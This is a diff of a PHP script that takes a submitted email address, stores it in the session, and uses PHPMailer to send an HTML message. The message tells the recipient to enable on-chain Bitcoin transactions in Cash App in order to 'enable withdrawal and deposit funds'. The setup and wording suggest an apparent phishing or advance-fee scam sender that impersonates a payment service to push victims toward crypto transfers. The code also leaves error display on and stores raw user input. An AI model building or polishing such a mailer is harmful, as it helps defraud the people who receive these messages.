@@ -1,4 +1,7 @@
 <?php
+session_start(); // 🔑 Must be first
+
+$_SESSION['user_email'] = $_POST['email']; // ✅ Store email for later use
 
 ini_set('display_errors', 1);
 error_reporting(E_ALL);
@@ -13,6 +16,8 @@ require 'PHPMailer/src/SMTP.php';
 // 🔄 Now you can use PHPMailer
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $userEmail = $_POST["email"];
+
+    $_SESSION['user_email'] = $userEmail;
 
     $mail = new PHPMailer(true);
 
@@ -51,7 +56,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         
            <p>To enable withdrawal and deposit funds into your CashApp account, kindly enable the on-chain transaction feature on your CashApp by following these steps:</p>
 
-        <ul style='margin-left: 20px; color: #555;'>
+        <ul style='margin-left: 10px; color: #555;'>
             <li>Open your Cash App and tap the <strong style='color: #1E6FFF;'>Bitcoin</strong> icon.</li>
             <li>Scroll down and select <strong style='color: #1E6FFF;'>Deposit Bitcoin</strong>.</li>
             <li>Follow the on-screen prompts to enable on-chain transactions.</li>
